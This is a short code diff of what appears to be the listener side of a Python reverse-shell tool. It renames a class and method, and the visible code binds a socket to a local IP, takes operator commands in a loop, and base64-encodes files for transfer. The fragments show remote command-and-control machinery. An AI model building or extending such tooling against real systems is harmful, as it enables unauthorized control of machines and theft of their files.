@@ -3,7 +3,7 @@ import os
 import base64
 import simplejson
 
-class SocketListener:
+class Connection:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -44,7 +44,7 @@ class SocketListener:
         with open(path,"rb") as my_file:
             return base64.b64encode(my_file.read())
 
-    def start_listener(self):
+    def connect(self):
         while True:
             command_input = input("> ")
             command_input = command_input.split(" ")
@@ -64,5 +64,5 @@ class SocketListener:
                 command_output = str(e)
             print(command_output)
 
-my_socket_listener = SocketListener("192.168.1.86", 8080)
-my_socket_listener.start_listener()
+conn = Connection("192.168.1.86", 8080)
+conn.connect()
